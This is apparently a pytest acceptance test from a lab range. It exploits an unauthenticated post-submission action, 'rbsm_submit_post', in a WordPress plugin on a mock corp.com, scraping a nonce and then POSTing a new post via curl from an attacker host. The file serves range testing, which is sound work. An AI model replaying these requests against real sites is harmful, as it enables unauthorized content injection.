import re

from conftest import TARGET_PUBLIC
from range import ATTACKER, run

CORP = "corp"
CORP_DB = "corp-db"
CORP_HOST = "Host: corp.com"
NONCE = re.compile(r'"nonce":"([a-f0-9]+)"')
POST_ID = re.compile(r'"post_id":(\d+)')


def _post_count():
    return int(run(CORP_DB, [
        "mysql", "-uwordpress", "-pwordpress", "wordpress", "-N", "-e",
        "SELECT COUNT(*) FROM wp_posts WHERE post_type='post';",
    ]).stdout.strip() or "0")


def _nonce():
    page = run(ATTACKER, [
        "curl", "-s", "-H", CORP_HOST, "--max-time", "20",
        f"{TARGET_PUBLIC}/submit-a-story/",
    ]).stdout
    found = NONCE.search(page)
    assert found, "no rbGlobalSubmissionSettings nonce on the live corp.com submission page; is corp-wp up?"
    return found.group(1)


def _submit_post(nonce, title):
    return run(ATTACKER, [
        "curl", "-s", "--max-time", "20",
        "-H", CORP_HOST,
        "--data-urlencode", "action=rbsm_submit_post",
        "--data-urlencode", f"_nonce={nonce}",
        "--data-urlencode", "formId=1",
        "--data-urlencode", f"title={title}",
        "--data-urlencode", "excerpt=written without an account",
        "--data-urlencode", "content=<p>written without an account via rbsm_submit_post</p>",
        "--data-urlencode", "userName=Anonymous Contributor",
        "--data-urlencode", "userEmail=anon@example.com",
        f"{TARGET_PUBLIC}/wp-admin/admin-ajax.php",
    ]).stdout.strip()


def test_the_unauthenticated_content_write_commits_a_new_post_row(stack_is_up):
    before = _post_count()
    title = "Unauthorized Post From the Acceptance Suite"
    post_id = None

    try:
        response = _submit_post(_nonce(), title)
        assert '"success":true' in response, f"the content-write request was refused: {response!r}"
        found = POST_ID.search(response)
        assert found, f"no post_id in the content-write response: {response!r}"
        post_id = found.group(1)
        assert _post_count() > before
    finally:
        if post_id is not None:
            run(CORP, ["wp", "--allow-root", "post", "delete", post_id, "--force"])
        assert _post_count() == before
